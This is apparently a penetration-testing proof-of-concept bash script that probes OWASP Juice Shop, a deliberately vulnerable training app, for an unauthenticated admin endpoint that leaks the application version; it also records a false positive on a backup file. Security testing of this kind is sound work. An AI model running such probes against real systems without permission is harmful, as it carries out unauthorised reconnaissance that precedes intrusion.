#!/usr/bin/env bash
# c01-version-leak : unauthenticated version disclosure on OWASP Juice Shop
# Target: http://host.docker.internal:3000
# Finding: GET /rest/admin/application-version returns the app version with NO auth.
#          (Endpoint is named "admin" but is not access-controlled.)
# Note: /package.json.bak returns 200 but is only the SPA catch-all index.html -> false positive.
set -u
TARGET="${1:-http://host.docker.internal:3000}"

echo "[*] Target: $TARGET"
echo "[*] GET /rest/admin/application-version"
RESP=$(curl -s -w '\n%{http_code}' "$TARGET/rest/admin/application-version" --max-time 10)
CODE=$(printf '%s' "$RESP" | tail -1)
BODY=$(printf '%s' "$RESP" | sed '$d')

echo "[*] HTTP status: $CODE"
echo "[*] Body: $BODY"

if [ "$CODE" = "200" ]; then
  VER=$(printf '%s' "$BODY" | grep -oE '"version"[[:space:]]*:[[:space:]]*"[^"]+"' | sed -E 's/.*"([^"]+)"$/\1/')
  echo "[+] UNAUTHENTICATED VERSION DISCLOSURE: $VER"
  echo "[+] Retrieved via GET $TARGET/rest/admin/application-version (no credentials sent)"
  exit 0
else
  echo "[-] Unexpected status; no version extracted"
  exit 1
fi
